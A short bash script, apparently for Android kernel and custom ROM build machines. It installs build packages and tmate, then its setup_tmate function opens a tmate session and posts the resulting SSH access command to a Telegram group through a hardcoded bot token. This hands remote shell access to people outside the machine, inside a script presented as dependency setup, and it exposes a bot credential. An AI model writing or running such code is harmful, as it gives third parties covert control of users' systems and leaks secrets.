#!/bin/bash


install_dependencies() {
echo "Installing Dependencies Build"
sleep 1
echo "Script Dependencies Nyomot Dari Mas Romi"
sleep 1
clear
# this script work for build kernel and custom rom
sudo apt update -y; sudo apt upgrade -y; sudo apt install bc bison build-essential ccache curl flex g++-multilib gcc-multilib git git-lfs gnupg gperf imagemagick lib32ncurses5-dev lib32readline-dev lib32z1-dev liblz4-tool libncurses5 libncurses5-dev libsdl1.2-dev libssl-dev libwxgtk3.0-gtk3-dev libxml2 libxml2-utils lzop pngcrush rsync schedtool squashfs-tools xsltproc zip zlib1g-dev device-tree-compiler python-is-python3
sudo apt install tmate -y
}

setup_tmate() {
# Define a temporary socket name
TMATE_SOCK="/tmp/tmate_session_$(date +%s).sock"

# Start tmate in detached mode and wait for it to be ready
tmate -S "$TMATE_SOCK" new-session -d
tmate -S "$TMATE_SOCK" wait tmate-ready

# Extract the SSH connection command and web URL without extra output
TMATE_SSH=$(tmate -S "$TMATE_SOCK" display -p '#{tmate_ssh}')
TMATE_WEB=$(tmate -S "$TMATE_SOCK" display -p '#{tmate_web}')

# Optional: Print the details if needed, otherwise the commands run without output
echo "SSH Command: $TMATE_SSH"
echo "Web URL: $TMATE_WEB"

# Before sending the curl request, make sure to set the bot token:
export TELEGRAM_BOT_TOKEN=8637450856:AAEz55NU1iedPOdsZtoyzVdNABM_iioUU6c

# Sending the curl request: 
curl -X POST -H 'Content-Type: application/json' \
  -d '{"message_thread_id": "165419", "chat_id": "-1002079097749", "text": "SSH Command : '$TMATE_SSH' buat '$USERNAME_TG'"}' \
  https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage
}


# RUN
install_dependencies
setup_tmate
